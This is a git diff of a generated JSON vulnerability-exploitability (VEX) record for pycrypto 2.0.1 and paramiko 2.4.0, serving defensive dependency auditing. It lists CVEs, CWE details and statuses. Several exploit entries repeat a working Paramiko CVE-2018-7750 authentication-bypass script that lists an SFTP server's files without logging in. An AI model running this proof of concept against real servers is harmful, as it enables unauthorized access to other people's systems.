@@ -1,22 +1,30 @@
 {
-  "@context": "https://github.com/GermanMT/depex/wiki/VAN-Spec-v0.1.0",
-  "timestamp": "2024-05-23 10:54:59.505220",
+  "@context": "https://github.com/GermanMT/vexgen/wiki/Extended-VEX-Spec-v0.1.0",
+  "@id": "https://github.com/GermanMT/VexGen",
+  "author": "depexorg",
+  "role": "Generate Automated VEX with Depex",
+  "timestamp": "2024-08-29 11:04:13.177841",
+  "last_updated": "2024-08-29 11:04:13.177841",
   "version": 1,
-  "statements_assisting_information": [
+  "tooling": "https://github.com/GermanMT/vexgen",
+  "extended_statements": [
     {
       "affected_component": "pycrypto",
       "affected_component_version": "2.0.1",
+      "affected_component_manager": "pypi",
       "vulnerability": {
         "@id": "https://nvd.nist.gov/vuln/detail/CVE-2009-0544",
         "name": "CVE-2009-0544",
         "description": "Buffer overflow in the PyCrypto ARC2 module 2.0.1 allows remote attackers to cause a denial of service and possibly execute arbitrary code via a large ARC2 key length.",
         "cvss": {
           "vuln_impact": 10.0,
+          "version": "2.0",
           "attack_vector": "AV:N/AC:L/Au:N/C:C/I:C/A:C"
         },
         "cwes": [
           {
             "@id": "https://cwe.mitre.org/data/definitions/119.html",
+            "abstraction": "Class",
             "name": "119",
             "description": {
               "xhtml:p": [
@@ -501,31 +509,40 @@
       "exploits": [
         {
           "@id": "https://www.exploit-db.com/exploits/32780",
+          "attack_vector": "NONE",
           "description": "",
           "payload": "source: https://www.securityfocus.com/bid/33674/info\r\n\r\nPyCrypto (Python Cryptography Toolkit) is prone to a buffer-overflow vulnerability because it fails to adequately verify user-supplied input.\r\n\r\nSuccessful exploits may allow attackers to execute arbitrary code in the context of applications using the vulnerable module. Failed attempts may lead to a denial-of-service condition.\r\n\r\n# -*- coding: utf-8 -*-\r\n#\r\n#  SelfTest/Cipher/ARC2.py: Self-test for the Alleged-RC2 cipher\r\n#\r\n# =======================================================================\r\n# Copyright (C) 2008  Dwayne C. Litzenberger <dlitz@dlitz.net>\r\n#\r\n# Permission is hereby granted, free of charge, to any person obtaining\r\n# a copy of this software and associated documentation files (the\r\n# \"Software\"), to deal in the Software without restriction, including\r\n# without limitation the rights to use, copy, modify, merge, publish,\r\n# distribute, sublicense, and/or sell copies of the Software, and to\r\n# permit persons to whom the Software is furnished to do so.\r\n#\r\n# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS\r\n# \"AS IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT\r\n# LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR\r\n# A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT\r\n# OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,\r\n# SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT\r\n# LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,\r\n# DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY\r\n# THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT\r\n# (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE\r\n# OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\r\n# =======================================================================\r\n#\r\n\r\n\"\"\"Self-test suite for Crypto.Cipher.ARC2\"\"\"\r\n\r\n__revision__ = \"$Id$\"\r\n\r\nfrom common import dict     # For compatibility with Python 2.1 and 2.2\r\n\r\nimport unittest\r\n\r\n# This is a list of (plaintext, ciphertext, key[, description[, extra_params]]) tuples.\r\ntest_data = [\r\n    # Test vectors from RFC 2268\r\n\r\n    # 63-bit effective key length\r\n    ('0000000000000000', 'ebb773f993278eff', '0000000000000000',\r\n        'RFC2268-1', dict(effective_keylen=63)),\r\n\r\n    # 64-bit effective key length\r\n    ('ffffffffffffffff', '278b27e42e2f0d49', 'ffffffffffffffff',\r\n        'RFC2268-2', dict(effective_keylen=64)),\r\n    ('1000000000000001', '30649edf9be7d2c2', '3000000000000000',\r\n        'RFC2268-3', dict(effective_keylen=64)),\r\n    ('0000000000000000', '61a8a244adacccf0', '88',\r\n        'RFC2268-4', dict(effective_keylen=64)),\r\n    ('0000000000000000', '6ccf4308974c267f', '88bca90e90875a',\r\n        'RFC2268-5', dict(effective_keylen=64)),\r\n    ('0000000000000000', '1a807d272bbe5db1', '88bca90e90875a7f0f79c384627bafb2',\r\n        'RFC2268-6', dict(effective_keylen=64)),\r\n\r\n    # 128-bit effective key length\r\n    ('0000000000000000', '2269552ab0f85ca6', '88bca90e90875a7f0f79c384627bafb2',\r\n        \"RFC2268-7\", dict(effective_keylen=128)),\r\n    ('0000000000000000', '5b78d3a43dfff1f1',\r\n        '88bca90e90875a7f0f79c384627bafb216f80a6f85920584c42fceb0be255daf1e',\r\n        \"RFC2268-8\", dict(effective_keylen=129)),\r\n\r\n    # Test vectors from PyCrypto 2.0.1's testdata.py\r\n    # 1024-bit effective key length\r\n    ('0000000000000000', '624fb3e887419e48', '5068696c6970476c617373',\r\n        'PCTv201-0'),\r\n    ('ffffffffffffffff', '79cadef44c4a5a85', '5068696c6970476c617373',\r\n        'PCTv201-1'),\r\n    ('0001020304050607', '90411525b34e4c2c', '5068696c6970476c617373',\r\n        'PCTv201-2'),\r\n    ('0011223344556677', '078656aaba61cbfb', '5068696c6970476c617373',\r\n        'PCTv201-3'),\r\n    ('0000000000000000', 'd7bcc5dbb4d6e56a', 'ffffffffffffffff', 'PCTv201-4'),\r\n    ('ffffffffffffffff', '7259018ec557b357', 'ffffffffffffffff', 'PCTv201-5'),\r\n    ('0001020304050607', '93d20a497f2ccb62', 'ffffffffffffffff', 'PCTv201-6'),\r\n    ('0011223344556677', 'cb15a7f819c0014d', 'ffffffffffffffff', 'PCTv201-7'),\r\n    ('0000000000000000', '63ac98cdf3843a7a',\r\n        'ffffffffffffffff5065746572477265656e6177617953e5ffe553',\r\n        'PCTv201-8'),\r\n    ('ffffffffffffffff', '3fb49e2fa12371dd',\r\n        'ffffffffffffffff5065746572477265656e6177617953e5ffe553',\r\n        'PCTv201-9'),\r\n    ('0001020304050607', '46414781ab387d5f',\r\n        'ffffffffffffffff5065746572477265656e6177617953e5ffe553',\r\n        'PCTv201-10'),\r\n    ('0011223344556677', 'be09dc81feaca271',\r\n        'ffffffffffffffff5065746572477265656e6177617953e5ffe553',\r\n        'PCTv201-11'),\r\n    ('0000000000000000', 'e64221e608be30ab', '53e5ffe553', 'PCTv201-12'),\r\n    ('ffffffffffffffff', '862bc60fdcd4d9a9', '53e5ffe553', 'PCTv201-13'),\r\n    ('0001020304050607', '6a34da50fa5e47de', '53e5ffe553', 'PCTv201-14'),\r\n    ('0011223344556677', '584644c34503122c', '53e5ffe553', 'PCTv201-15'),\r\n]\r\n\r\nclass BufferOverflowTest(unittest.TestCase):\r\n    # Test a buffer overflow found in older versions of PyCrypto\r\n\r\n    def setUp(self):\r\n        global ARC2\r\n        from Crypto.Cipher import ARC2\r\n\r\n    def runTest(self):\r\n        \"\"\"ARC2 with keylength > 128\"\"\"\r\n        key = \"x\" * 16384\r\n        mode = ARC2.MODE_ECB\r\n        self.assertRaises(ValueError, ARC2.new, key, mode)\r\n\r\ndef get_tests(config={}):\r\n    from Crypto.Cipher import ARC2\r\n    from common import make_block_tests\r\n\r\n    tests = make_block_tests(ARC2, \"ARC2\", test_data)\r\n    tests.append(BufferOverflowTest())\r\n\r\n    return tests\r\n\r\nif __name__ == '__main__':\r\n    import unittest\r\n    suite = lambda: unittest.TestSuite(get_tests())\r\n    unittest.main(defaultTest='suite')\r\n\r\n# vim:set ts=4 sw=4 sts=4 expandtab:"
         },
         {
           "@id": "https://www.seebug.org/vuldb/ssvid-4798",
+          "attack_vector": "AV:NETWORK/AC:LOW/Au:NONE/C:COMPLETE/I:COMPLETE/A:COMPLETE/",
           "description": "BUGTRAQ  ID: 33674\r\nCVE(CAN) ID: CVE-2009-0544\r\n\r\nPyCrypto\u662f\u4f7f\u7528Python\u7f16\u5199\u7684\u52a0\u5bc6\u5de5\u5177\u5305\u3002\r\n\r\nPyCrypto\u7684ARC2\u6a21\u5757\u4e2d\u5b58\u5728\u7f13\u51b2\u533a\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u5982\u679c\u8fdc\u7a0b\u653b\u51fb\u8005\u5728\u53d1\u9001\u7684\u8bf7\u6c42\u4e2d\u5305\u542b\u6709\u8d85\u957f\u7684ARC2\u5bc6\u94a5\u957f\u5ea6\u7684\u8bdd\uff0c\u5c31\u53ef\u4ee5\u89e6\u53d1\u8fd9\u4e2a\u6ea2\u51fa\uff0c\u5bfc\u81f4\u62d2\u7edd\u670d\u52a1\u6216\u6267\u884c\u4efb\u610f\u6307\u4ee4\u3002\n\nDwayne C. Litzenberger PyCrypto 2.0.x\n \u5382\u5546\u8865\u4e01\uff1a\r\n\r\nDwayne C. Litzenberger\r\n----------------------\r\n\u76ee\u524d\u5382\u5546\u5df2\u7ecf\u53d1\u5e03\u4e86\u5347\u7ea7\u8865\u4e01\u4ee5\u4fee\u590d\u8fd9\u4e2a\u5b89\u5168\u95ee\u9898\uff0c\u8bf7\u5230\u5382\u5546\u7684\u4e3b\u9875\u4e0b\u8f7d\uff1a\r\n\r\n<a href=http://gitweb2.dlitz.net/?p=crypto/pycrypto-2.x.git;a=commitdiff;h=d1c4875e1f220652fe7ff8358f56dee3b2aba31b target=_blank rel=external nofollow>http://gitweb2.dlitz.net/?p=crypto/pycrypto-2.x.git;a=commitdiff;h=d1c4875e1f220652fe7ff8358f56dee3b2aba31b</a>",
           "payload": "\n                                                http://gitweb2.dlitz.net/?p=crypto/pycrypto-2.x.git;a=blob;f=SelfTest/Cipher/test_ARC2.py;h=84d42410\r\n\n                              "
         }
       ],
-      "priority": 9.0
+      "priority": 9.0,
+      "timestamp": "2024-08-29 11:04:13.177841",
+      "last_updated": "2024-08-29 11:04:13.177841",
+      "status": "not_affected",
+      "justification": "vulnerable_code_not_present"
     },
     {
       "affected_component": "paramiko",
       "affected_component_version": "2.4.0",
+      "affected_component_manager": "pypi",
       "vulnerability": {
         "@id": "https://nvd.nist.gov/vuln/detail/CVE-2018-7750",
         "name": "CVE-2018-7750",
         "description": "transport.py in the SSH server implementation of Paramiko before 1.17.6, 1.18.x before 1.18.5, 2.0.x before 2.0.8, 2.1.x before 2.1.5, 2.2.x before 2.2.3, 2.3.x before 2.3.2, and 2.4.x before 2.4.1 does not properly check whether authentication is completed before processing other requests, as demonstrated by channel-open. A customized SSH client can simply skip the authentication step.",
         "cvss": {
           "vuln_impact": 5.9,
+          "version": "3.1",
           "attack_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
         },
         "cwes": [
           {
             "@id": "https://cwe.mitre.org/data/definitions/287.html",
+            "abstraction": "Class",
             "name": "287",
             "description": "When an actor claims to have a given identity, the product does not prove or insufficiently proves that the claim is correct.",
             "consequences": {
@@ -785,7 +802,7 @@
       },
       "reachable_code": [
         {
-          "path_to_file": "vulnerability_assisting_information/main/files/paramiko_test.py",
+          "path_to_file": "vex_generation/main/files/paramiko_test.py",
           "used_artifacts": [
             {
               "artifact_name": "Transport",
@@ -800,61 +817,76 @@
       "exploits": [
         {
           "@id": "https://www.exploit-db.com/exploits/45748",
+          "attack_vector": "AV:N/AC:L/Au:N/C:P/I:P/A:P",
           "description": "",
           "payload": "# Exploit Title: Nutanix AOS & Prism - SFTP Authentication Bypass\r\n# Date: 2018-10-27\r\n# Exploit Author: Adam Brown\r\n# Vendor Homepage: https://www.nutanix.org\r\n# Software Link: https://www.nutanix.com/products/software-options/\r\n# Version: < 5.5.5 (LTS), < 5.8.1 (STS)\r\n# Tested on: Acropolis Operating System\r\n# CVE : Related to CVE-2018-7750\r\n#\r\n# This PoC is based on discussions found at the following blog post:\r\n#   https://coffeegist.com/security/paramiko-ssh-authentication-bypass-in-nutanix/\r\n# TLDR, the Acropolis SFTP server doesn't check if the client has completed the\r\n# authentication step before allowing the client to open channels. The PoC below\r\n# connects to the acropolis SFTP server, and lists the root directory without\r\n# authenticating.\r\n\r\n#!/usr/bin/python\r\nimport paramiko\r\n\r\nhost = '127.0.0.1'\r\nport = 2222\r\n\r\ntrans = paramiko.Transport((host, port))\r\ntrans.start_client()\r\n\r\n# If the call below is skipped, no username or password is required.\r\n# trans.auth_password('username', 'password')\r\n\r\nsftp = paramiko.SFTPClient.from_transport(trans)\r\nprint(sftp.listdir('/'))\r\nsftp.close()"
         },
         {
           "@id": "https://www.exploit-db.com/exploits/45712",
+          "attack_vector": "AV:N/AC:L/Au:N/C:P/I:P/A:P",
           "description": "",
           "payload": "# Exploit Title: Paramiko 2.4.1 - Authentication Bypass\r\n# Date: 2018-10-27\r\n# Exploit Author: Adam Brown\r\n# Vendor Homepage: https://www.paramiko.org\r\n# Software Link: https://github.com/paramiko/paramiko/tree/v1.15.2\r\n# Version: < 1.17.6, 1.18.x < 1.18.5, 2.0.x < 2.0.8, 2.1.x < 2.1.5, 2.2.x < 2.2.3, 2.3.x < 2.3.2, and 2.4.x < 2.4.1\r\n# Tested on: Multiple\r\n# CVE : CVE-2018-7750\r\n\r\n# This PoC is based on discussions found at the following github issue:\r\n# https://github.com/paramiko/paramiko/issues/1175\r\n# TLDR, Paramiko doesn't check if the client has completed the authentication step\r\n# before allowing the client to open channels. The PoC below connects to an SFTP\r\n# server, and lists the root directory without authenticating. Slight modification\r\n# is required if you want to open an SSH channel.\r\n\r\n#!/usr/bin/python\r\nimport paramiko\r\n\r\nhost = '127.0.0.1'\r\nport = 22\r\n\r\ntrans = paramiko.Transport((host, port))\r\ntrans.start_client()\r\n\r\n# If the call below is skipped, no username or password is required.\r\n# trans.auth_password('username', 'password')\r\n\r\nsftp = paramiko.SFTPClient.from_transport(trans)\r\nprint(sftp.listdir('/'))\r\nsftp.close()"
         },
         {
           "@id": "Unknown",
+          "attack_vector": "AV:N/AC:L/Au:N/C:P/I:P/A:P",
           "description": "\nNutanix AOS  Prism  5.5.5 (LTS)   5.8.1 (STS) - SFTP Authentication Bypass",
           "payload": "# Exploit Title: Nutanix AOS & Prism - SFTP Authentication Bypass\n# Date: 2018-10-27\n# Exploit Author: Adam Brown\n# Vendor Homepage: https://www.nutanix.org\n# Software Link: https://www.nutanix.com/products/software-options/\n# Version: < 5.5.5 (LTS), < 5.8.1 (STS)\n# Tested on: Acropolis Operating System\n# CVE : Related to CVE-2018-7750\n#\n# This PoC is based on discussions found at the following blog post:\n#   https://coffeegist.com/security/paramiko-ssh-authentication-bypass-in-nutanix/\n# TLDR, the Acropolis SFTP server doesn't check if the client has completed the\n# authentication step before allowing the client to open channels. The PoC below\n# connects to the acropolis SFTP server, and lists the root directory without\n# authenticating.\n\n#!/usr/bin/python\nimport paramiko\n\nhost = '127.0.0.1'\nport = 2222\n\ntrans = paramiko.Transport((host, port))\ntrans.start_client()\n\n# If the call below is skipped, no username or password is required.\n# trans.auth_password('username', 'password')\n\nsftp = paramiko.SFTPClient.from_transport(trans)\nprint(sftp.listdir('/'))\nsftp.close()"
         },
         {
           "@id": "Unknown",
+          "attack_vector": "AV:N/AC:L/Au:N/C:P/I:P/A:P",
           "description": "\nParamiko 2.4.1 - Authentication Bypass",
           "payload": "# Exploit Title: Paramiko 2.4.1 - Authentication Bypass\n# Date: 2018-10-27\n# Exploit Author: Adam Brown\n# Vendor Homepage: https://www.paramiko.org\n# Software Link: https://github.com/paramiko/paramiko/tree/v1.15.2\n# Version: < 1.17.6, 1.18.x < 1.18.5, 2.0.x < 2.0.8, 2.1.x < 2.1.5, 2.2.x < 2.2.3, 2.3.x < 2.3.2, and 2.4.x < 2.4.1\n# Tested on: Multiple\n# CVE : CVE-2018-7750\n\n# This PoC is based on discussions found at the following github issue:\n# https://github.com/paramiko/paramiko/issues/1175\n# TLDR, Paramiko doesn't check if the client has completed the authentication step\n# before allowing the client to open channels. The PoC below connects to an SFTP\n# server, and lists the root directory without authenticating. Slight modification\n# is required if you want to open an SSH channel.\n\n#!/usr/bin/python\nimport paramiko\n\nhost = '127.0.0.1'\nport = 22\n\ntrans = paramiko.Transport((host, port))\ntrans.start_client()\n\n# If the call below is skipped, no username or password is required.\n# trans.auth_password('username', 'password')\n\nsftp = paramiko.SFTPClient.from_transport(trans)\nprint(sftp.listdir('/'))\nsftp.close()"
         },
         {
           "@id": "https://packetstormsecurity.com/files/149983/Paramiko-2.4.1-Authentication-Bypass.html",
+          "attack_vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/",
           "description": "",
           "payload": "`# Exploit Title: Paramiko 2.4.1 - Authentication Bypass  \n# Date: 2018-10-27  \n# Exploit Author: Adam Brown  \n# Vendor Homepage: https://www.paramiko.org  \n# Software Link: https://github.com/paramiko/paramiko/tree/v1.15.2  \n# Version: < 1.17.6, 1.18.x < 1.18.5, 2.0.x < 2.0.8, 2.1.x < 2.1.5, 2.2.x < 2.2.3, 2.3.x < 2.3.2, and 2.4.x < 2.4.1  \n# Tested on: Multiple  \n# CVE : CVE-2018-7750  \n  \n# This PoC is based on discussions found at the following github issue:  \n# https://github.com/paramiko/paramiko/issues/1175  \n# TLDR, Paramiko doesn't check if the client has completed the authentication step  \n# before allowing the client to open channels. The PoC below connects to an SFTP  \n# server, and lists the root directory without authenticating. Slight modification  \n# is required if you want to open an SSH channel.  \n  \n#!/usr/bin/python  \nimport paramiko  \n  \nhost = '127.0.0.1'  \nport = 22  \n  \ntrans = paramiko.Transport((host, port))  \ntrans.start_client()  \n  \n# If the call below is skipped, no username or password is required.  \n# trans.auth_password('username', 'password')  \n  \nsftp = paramiko.SFTPClient.from_transport(trans)  \nprint(sftp.listdir('/'))  \nsftp.close()  \n  \n`\n"
         },
         {
           "@id": "https://packetstormsecurity.com/files/150020/Nutanix-AOS-And-Prism-SFTP-Authentication-Bypass.html",
+          "attack_vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/",
           "description": "",
           "payload": "`# Exploit Title: Nutanix AOS & Prism - SFTP Authentication Bypass  \n# Date: 2018-10-27  \n# Exploit Author: Adam Brown  \n# Vendor Homepage: https://www.nutanix.org  \n# Software Link: https://www.nutanix.com/products/software-options/  \n# Version: < 5.5.5 (LTS), < 5.8.1 (STS)  \n# Tested on: Acropolis Operating System  \n# CVE : Related to CVE-2018-7750  \n#  \n# This PoC is based on discussions found at the following blog post:  \n# https://coffeegist.com/security/paramiko-ssh-authentication-bypass-in-nutanix/  \n# TLDR, the Acropolis SFTP server doesn't check if the client has completed the  \n# authentication step before allowing the client to open channels. The PoC below  \n# connects to the acropolis SFTP server, and lists the root directory without  \n# authenticating.  \n  \n#!/usr/bin/python  \nimport paramiko  \n  \nhost = '127.0.0.1'  \nport = 2222  \n  \ntrans = paramiko.Transport((host, port))  \ntrans.start_client()  \n  \n# If the call below is skipped, no username or password is required.  \n# trans.auth_password('username', 'password')  \n  \nsftp = paramiko.SFTPClient.from_transport(trans)  \nprint(sftp.listdir('/'))  \nsftp.close()  \n  \n  \n`\n"
         },
         {
           "@id": "https://0day.today/exploit/description/31454",
+          "attack_vector": "AV:N/AC:L/Au:N/C:P/I:P/A:P",
           "description": "",
           "payload": "# Exploit Title: Paramiko 2.4.1 - Authentication Bypass\n# Exploit Author: Adam Brown\n# Vendor Homepage: https://www.paramiko.org\n# Software Link: https://github.com/paramiko/paramiko/tree/v1.15.2\n# Version: < 1.17.6, 1.18.x < 1.18.5, 2.0.x < 2.0.8, 2.1.x < 2.1.5, 2.2.x < 2.2.3, 2.3.x < 2.3.2, and 2.4.x < 2.4.1\n# Tested on: Multiple\n# CVE : CVE-2018-7750\n \n# This PoC is based on discussions found at the following github issue:\n# https://github.com/paramiko/paramiko/issues/1175\n# TLDR, Paramiko doesn't check if the client has completed the authentication step\n# before allowing the client to open channels. The PoC below connects to an SFTP\n# server, and lists the root directory without authenticating. Slight modification\n# is required if you want to open an SSH channel.\n \n#!/usr/bin/python\nimport paramiko\n \nhost = '127.0.0.1'\nport = 22\n \ntrans = paramiko.Transport((host, port))\ntrans.start_client()\n \n# If the call below is skipped, no username or password is required.\n# trans.auth_password('username', 'password')\n \nsftp = paramiko.SFTPClient.from_transport(trans)\nprint(sftp.listdir('/'))\nsftp.close()\n"
         },
         {
           "@id": "https://0day.today/exploit/description/31461",
+          "attack_vector": "AV:N/AC:L/Au:N/C:P/I:P/A:P",
           "description": "",
           "payload": "# Exploit Title: Nutanix AOS & Prism - SFTP Authentication Bypass\n# Exploit Author: Adam Brown\n# Vendor Homepage: https://www.nutanix.org\n# Software Link: https://www.nutanix.com/products/software-options/\n# Version: < 5.5.5 (LTS), < 5.8.1 (STS)\n# Tested on: Acropolis Operating System\n# CVE : Related to CVE-2018-7750\n#\n# This PoC is based on discussions found at the following blog post:\n#   https://coffeegist.com/security/paramiko-ssh-authentication-bypass-in-nutanix/\n# TLDR, the Acropolis SFTP server doesn't check if the client has completed the\n# authentication step before allowing the client to open channels. The PoC below\n# connects to the acropolis SFTP server, and lists the root directory without\n# authenticating.\n \n#!/usr/bin/python\nimport paramiko\n \nhost = '127.0.0.1'\nport = 2222\n \ntrans = paramiko.Transport((host, port))\ntrans.start_client()\n \n# If the call below is skipped, no username or password is required.\n# trans.auth_password('username', 'password')\n \nsftp = paramiko.SFTPClient.from_transport(trans)\nprint(sftp.listdir('/'))\nsftp.close()\n"
         }
       ],
-      "priority": 7.13
+      "priority": 7.13,
+      "timestamp": "2024-08-29 11:04:13.177841",
+      "last_updated": "2024-08-29 11:04:13.177841",
+      "status": "Go to VEX Extended file to find vulnerability assisted information.",
+      "justification": "Go to VEX Entended file to find vulnerability assisted information."
     },
     {
       "affected_component": "pycrypto",
       "affected_component_version": "2.0.1",
+      "affected_component_manager": "pypi",
       "vulnerability": {
         "@id": "https://nvd.nist.gov/vuln/detail/CVE-2013-7459",
         "name": "CVE-2013-7459",
         "description": "Heap-based buffer overflow in the ALGnew function in block_templace.c in Python Cryptography Toolkit (aka pycrypto) allows remote attackers to execute arbitrary code as demonstrated by a crafted iv parameter to cryptmsg.py.",
         "cvss": {
           "vuln_impact": 5.9,
+          "version": "3.0",
           "attack_vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
         },
         "cwes": [
           {
             "@id": "https://cwe.mitre.org/data/definitions/119.html",
+            "abstraction": "Class",
             "name": "119",
             "description": {
               "xhtml:p": [
@@ -1336,22 +1368,29 @@
           }
         ]
       },
-      "priority": 5.13
+      "priority": 5.13,
+      "timestamp": "2024-08-29 11:04:13.177841",
+      "last_updated": "2024-08-29 11:04:13.177841",
+      "status": "not_affected",
+      "justification": "vulnerable_code_not_present"
     },
     {
       "affected_component": "paramiko",
       "affected_component_version": "2.4.0",
+      "affected_component_manager": "pypi",
       "vulnerability": {
         "@id": "https://nvd.nist.gov/vuln/detail/CVE-2023-48795",
         "name": "CVE-2023-48795",
         "description": "The SSH transport protocol with certain OpenSSH extensions, found in OpenSSH before 9.6 and other products, allows remote attackers to bypass integrity checks such that some packets are omitted (from the extension negotiation message), and a client and server may consequently end up with a connection for which some security features have been downgraded or disabled, aka a Terrapin attack. This occurs because the SSH Binary Packet Protocol (BPP), implemented by these extensions, mishandles the handshake phase and mishandles use of sequence numbers. For example, there is an effective attack against SSH's use of ChaCha20-Poly1305 (and CBC with Encrypt-then-MAC). The bypass occurs in chacha20-poly1305@openssh.com and (if CBC is used) the -etm@openssh.com MAC algorithms. This also affects Maverick Synergy Java SSH API before 3.1.0-SNAPSHOT, Dropbear through 2022.83, Ssh before 5.1.1 in Erlang/OTP, PuTTY before 0.80, AsyncSSH before 2.14.2, golang.org/x/crypto before 0.17.0, libssh before 0.10.6, libssh2 through 1.11.0, Thorn Tech SFTP Gateway before 3.4.6, Tera Term before 5.1, Paramiko before 3.4.0, jsch before 0.2.15, SFTPGo before 2.5.6, Netgate pfSense Plus through 23.09.1, Netgate pfSense CE through 2.7.2, HPN-SSH through 18.2.0, ProFTPD before 1.3.8b (and before 1.3.9rc2), ORYX CycloneSSH before 2.3.4, NetSarang XShell 7 before Build 0144, CrushFTP before 10.6.0, ConnectBot SSH library before 2.2.22, Apache MINA sshd through 2.11.0, sshj through 0.37.0, TinySSH through 20230101, trilead-ssh2 6401, LANCOM LCOS and LANconfig, FileZilla before 3.66.4, Nova before 11.8, PKIX-SSH before 14.4, SecureCRT before 9.4.3, Transmit5 before 5.10.4, Win32-OpenSSH before 9.5.0.0p1-Beta, WinSCP before 6.2.2, Bitvise SSH Server before 9.32, Bitvise SSH Client before 9.33, KiTTY through 0.76.1.13, the net-ssh gem 7.2.0 for Ruby, the mscdex ssh2 module before 1.15.0 for Node.js, the thrussh library before 0.35.1 for Rust, and the Russh crate before 0.40.2 for Rust.",
         "cvss": {
           "vuln_impact": 3.6,
+          "version": "3.1",
           "attack_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N"
         },
         "cwes": [
           {
             "@id": "https://cwe.mitre.org/data/definitions/354.html",
+            "abstraction": "Base",
             "name": "354",
             "description": "Improper validation of checksums before use results in an unnecessary risk that can easily be mitigated. The protocol specification describes the algorithm used for calculating the checksum. It is then a simple matter of implementing the calculation and verifying that the calculated checksum and the received checksum match. Improper verification of the calculated checksum and the received checksum can lead to far greater consequences.",
             "consequences": [
@@ -1436,7 +1475,7 @@
       },
       "reachable_code": [
         {
-          "path_to_file": "vulnerability_assisting_information/main/files/paramiko_test.py",
+          "path_to_file": "vex_generation/main/files/paramiko_test.py",
           "used_artifacts": [
             {
               "artifact_name": "Transport",
@@ -1448,22 +1487,29 @@
           ]
         }
       ],
-      "priority": 4.52
+      "priority": 4.52,
+      "timestamp": "2024-08-29 11:04:13.177841",
+      "last_updated": "2024-08-29 11:04:13.177841",
+      "status": "Go to VEX Extended file to find vulnerability assisted information.",
+      "justification": "Go to VEX Entended file to find vulnerability assisted information."
     },
     {
       "affected_component": "paramiko",
       "affected_component_version": "2.4.0",
+      "affected_component_manager": "pypi",
       "vulnerability": {
         "@id": "https://nvd.nist.gov/vuln/detail/CVE-2022-24302",
         "name": "CVE-2022-24302",
         "description": "In Paramiko before 2.10.1, a race condition (between creation and chmod) in the write_private_key_file function could allow unauthorized information disclosure.",
         "cvss": {
           "vuln_impact": 3.6,
+          "version": "3.1",
           "attack_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N"
         },
         "cwes": [
           {
             "@id": "https://cwe.mitre.org/data/definitions/362.html",
+            "abstraction": "Class",
             "name": "362",
             "description": {
               "xhtml:p": [
@@ -1836,22 +1882,29 @@
           }
         ]
       },
-      "priority": 3.52
+      "priority": 3.52,
+      "timestamp": "2024-08-29 11:04:13.177841",
+      "last_updated": "2024-08-29 11:04:13.177841",
+      "status": "not_affected",
+      "justification": "vulnerable_code_not_present"
     },
     {
       "affected_component": "pycrypto",
       "affected_component_version": "2.0.1",
+      "affected_component_manager": "pypi",
       "vulnerability": {
         "@id": "https://nvd.nist.gov/vuln/detail/CVE-2018-6594",
         "name": "CVE-2018-6594",
         "description": "lib/Crypto/PublicKey/ElGamal.py in PyCrypto through 2.6.1 generates weak ElGamal key parameters, which allows attackers to obtain sensitive information by reading ciphertext data (i.e., it does not have semantic security in face of a ciphertext-only attack). The Decisional Diffie-Hellman (DDH) assumption does not hold for PyCrypto's ElGamal implementation.",
         "cvss": {
           "vuln_impact": 3.6,
+          "version": "3.0",
           "attack_vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
         },
         "cwes": [
           {
             "@id": "https://cwe.mitre.org/data/definitions/326.html",
+            "abstraction": "Class",
             "name": "326",
             "description": "A weak encryption scheme can be subjected to brute force attacks that have a reasonable chance of succeeding using current attack methods and resources.",
             "consequences": {
@@ -1878,42 +1931,59 @@
           }
         ]
       },
-      "priority": 3.52
+      "priority": 3.52,
+      "timestamp": "2024-08-29 11:04:13.177841",
+      "last_updated": "2024-08-29 11:04:13.177841",
+      "status": "not_affected",
+      "justification": "vulnerable_code_not_present"
     },
     {
       "affected_component": "pycrypto",
       "affected_component_version": "2.0.1",
+      "affected_component_manager": "pypi",
       "vulnerability": {
         "@id": "https://nvd.nist.gov/vuln/detail/CVE-2012-2417",
         "name": "CVE-2012-2417",
         "description": "PyCrypto before 2.6 does not produce appropriate prime numbers when using an ElGamal scheme to generate a key, which reduces the signature space or public key space and makes it easier for attackers to conduct brute force attacks to obtain the private key.",
         "cvss": {
           "vuln_impact": 2.9,
+          "version": "2.0",
           "attack_vector": "AV:N/AC:M/Au:N/C:N/I:P/A:N"
         }
       },
       "exploits": [
         {
           "@id": "https://www.seebug.org/vuldb/ssvid-60160",
+          "attack_vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:NONE/I:PARTIAL/A:NONE/",
